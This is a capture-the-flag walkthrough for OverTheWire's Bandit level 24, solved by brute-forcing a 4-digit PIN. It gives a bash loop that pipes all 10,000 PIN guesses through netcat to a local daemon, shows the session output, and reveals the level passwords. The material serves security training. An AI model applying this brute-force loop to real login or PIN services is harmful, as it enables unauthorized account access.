# Level 24 - Level 25: Bandit - OverTheWire

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time.

## Solution
This level is a brute force challenge, and first requires us to `nc localhost 30002`, where there is a listener. From there, we are prompted to enter the password for the previous level as well as the correct four digit pincode on a single line.

We can write a script to do exactly that. In the script, we first create a `for` loop which will iterate through numbers 0000 to 9999. We can do this with the following syntax: `for i in {0001..9999}; do`, where `i` will represent the current iteration, or in this case, four digit pincode.

Within that `for` loop, we can simply `echo` a string containing the password plus the variable `$i`. This will output `password 0000`, `password 0001`, `password 0002` and so on - this is brute forcing.

Finally we can finish the loop with the `done` syntax, and we can then pipe that out to the `nc localhost 30002` command. This will ensure the output of each brute force attempt will be sent to the `nc` connection. From there, it's just a matter of waiting as the script iterates, and eventually we reveal the password.

```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
Wrong! Please enter the correct pincode. Try again.

bandit24@bandit:~$ vi /tmp/brute.sh

#!/bin/bash

for i in {0001..9999}; do
    echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
done | nc localhost 30002

bandit24@bandit:~$ chmod 700 /tmp/brute.sh
bandit24@bandit:~$ /tmp/brute.sh

Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.

```